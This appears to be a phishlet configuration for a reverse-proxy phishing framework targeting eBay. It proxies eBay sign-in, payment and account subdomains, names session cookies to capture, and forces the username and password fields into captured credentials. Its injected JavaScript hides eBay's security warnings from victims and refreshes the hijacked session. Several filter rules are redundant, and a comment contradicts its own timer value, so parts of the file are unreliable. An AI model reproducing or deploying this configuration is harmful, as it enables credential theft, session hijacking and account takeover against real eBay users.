---
name: ebay
author: Anon0369G
min_ver: 3.0.0
proxy_hosts:
  - phish_sub: www
    orig_sub: www
    domain: ebay.com
    session: true
    is_landing: true
  - phish_sub: signin
    orig_sub: signin
    domain: ebay.com
    session: true
  - phish_sub: pay
    orig_sub: pay
    domain: ebay.com
    session: true
  - phish_sub: my
    orig_sub: my
    domain: ebay.com
    session: true
sub_filters:
  - triggers_on: www.ebay.com
    orig_sub: www
    domain: ebay.com
    search: https://{hostname}/
    replace: https://{hostname}
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: www.ebay.com
    orig_sub: www
    domain: ebay.com
    search: https://{hostname}/
    replace: https://{hostname}/
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: signin.ebay.com
    orig_sub: signin
    domain: ebay.com
    search: https://signin.{hostname}/
    replace: https://signin.{hostname}/
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: signin.ebay.com
    orig_sub: signin
    domain: ebay.com
    search: https://auth.{hostname}/
    replace: https://signin.{hostname}/
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: pay.ebay.com
    orig_sub: pay
    domain: ebay.com
    search: https://pay.{hostname}/
    replace: https://pay.{hostname}/
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: my.ebay.com
    orig_sub: my
    domain: ebay.com
    search: https://my.{hostname}/
    replace: https://my.{hostname}/
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: my.ebay.com
    orig_sub: account
    domain: ebay.com
    search: https://account.{hostname}/
    replace: https://my.{hostname}/
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: www.ebay.com
    orig_sub: www
    domain: ebay.com
    search: https://{hostname}/logout
    replace: https://{hostname}/logout
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: signin.ebay.com
    orig_sub: signin
    domain: ebay.com
    search: https://signin.{hostname}/logout
    replace: https://signin.{hostname}/logout
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: www.ebay.com
    orig_sub: www
    domain: ebay.com
    search: '"https://{hostname}/'
    replace: '"https://{hostname}/'
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: www.ebay.com
    orig_sub: www
    domain: ebay.com
    search: "'https://{hostname}/"
    replace: "'https://{hostname}/"
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: www.ebay.com
    orig_sub: www
    domain: ebay.com
    search: "@{hostname}"
    replace: "@{hostname}"
    mimes:
      - text/html
      - application/json
      - application/javascript
auth_tokens:
  - domain: .ebay.com
    keys:
      - s
      - dp1
      - npii
      - eid
      - ebay_token
    type: cookie
    session_keys:
      - s
      - dp1
auth_urls:
  - https://signin.ebay.com/ws/eBayISAPI.dll?SignIn
  - https://www.ebay.com/signin
  - https://www.ebay.com/myb/SignIn
  - https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&signInAction=login
  - https://www.ebay.com/verify
urls:
  login: https://signin.ebay.com/ws/eBayISAPI.dll?SignIn
  logout: https://www.ebay.com/logout
  MFA: https://www.ebay.com/mfa
  password_reset: https://www.ebay.com/password-reset
  account_recovery: https://www.ebay.com/account-recovery
force_post:
  - domain: 'signin.ebay.com'
    path: '/ws/eBayISAPI.dll?SignIn'
    type: post
    force:
      - key: 'userid'
        search: '.*'
        replace: '{{credentials.username}}'
        value: '{{credentials.username}}'
      - key: 'pass'
        search: '.*'
        replace: '{{credentials.password}}'
        value: '{{credentials.password}}'

credentials:
  username:
    key: 'userid'         # The name of the email/username field on eBay login
    type: 'email'          # Field type for email
    required: true
    search: 'userid'
  password:
    key: 'pass'           # The name of the password field on eBay login
    type: 'password'       # Field type for password
    required: true
    search: 'pass'
    
login:
  domain: 'signin.ebay.com'  # The target domain for the login form
  path: '/ws/eBayISAPI.dll?SignIn'  # Path for login form submission
  method: 'POST'  # HTTP method for form submission
  form:
    fields:
      - { name: 'userid', required: true }    # Username field
      - { name: 'pass', required: true }      # Password field
rules:
  # Rule 1: Handle login page JavaScript injection
  - triggers:
      - domain: ebay.com
        path: /signin
    action: inject
    inject_js:
      code: |
        (function() {
          console.log("Custom JS for eBay login page");
          // Hiding any potential security alerts on login
          const securityAlerts = document.querySelectorAll('.security-alert, .login-warning');
          securityAlerts.forEach(el => el.style.display = 'none');
          
          // Optional: Log submission event for debugging
          const loginForm = document.querySelector('form');
          if (loginForm) {
            loginForm.addEventListener('submit', () => {
              console.log("Login form submitted.");
            });
          }
        })();

  # Rule 2: Handle MFA page injection
  - triggers:
      - domain: ebay.com
        path: /mfa
        cookie:
          contains: dp1    # Check if the user's session has dp1 cookie (used by eBay for session management)
    action: inject
    inject_js:
      code: |
        (function() {
          console.log("Handling eBay MFA page");
          // Code to handle MFA prompts if needed.
          // Optional: Automatically advance if certain elements are present
          const mfaPrompt = document.querySelector('.mfa-prompt');
          if (mfaPrompt) {
            console.log("MFA prompt detected. Ensure user interaction.");
          }
        })();

  # Rule 3: Handle re-authentication page (if user is redirected to it)
  - triggers:
      - domain: ebay.com
        path: /reauth
        cookie:
          contains: ebay_token  # Session-based token for eBay re-authentication check
    action: inject
    inject_js:
      code: |
        (function() {
          console.log("Handling eBay re-authentication for session continuity");
          // Additional JavaScript for handling the re-authentication flow if needed.
        })();

  # Rule 4: Redirect to login page upon logout
  - triggers:
      - domain: ebay.com
        path: /logout
    action: redirect
    redirect_to: https://www.ebay.com/signin

  # Rule 5: Redirect error pages to the main login page for a seamless experience
  - triggers:
      - domain: ebay.com
        path: /n/error     # This is commonly used for handling error redirects.
    action: redirect
    redirect_to: https://www.ebay.com/signin
js_inject:
- trigger_domains: ["signin.ebay.com", "www.ebay.com", "pay.ebay.com", "my.ebay.com", "auth.ebay.com"]
  trigger_paths: ["/signin", "/signin?signInAction=login", "/myb/SignIn", "/verify", "/my", "/myb/Account", "/pay", "/pay/checkout", "/logout"]
  script: >
    (function() {
        const securityMessages = document.querySelectorAll('.security-warning, .login-notice');
        securityMessages.forEach(element => element.style.display = 'none');
        
        const loginForm = document.querySelector('#signin-form');
        if (loginForm) {
            loginForm.addEventListener('submit', function() {
                console.log("Login form submitted.");
            });
        }
        
        setInterval(() => {
            fetch(window.location.href, { method: 'GET', credentials: 'include' });
            console.log("Session refreshed to maintain active login.");
        }, 40000);  // 30 seconds interval for session refresh
    })();
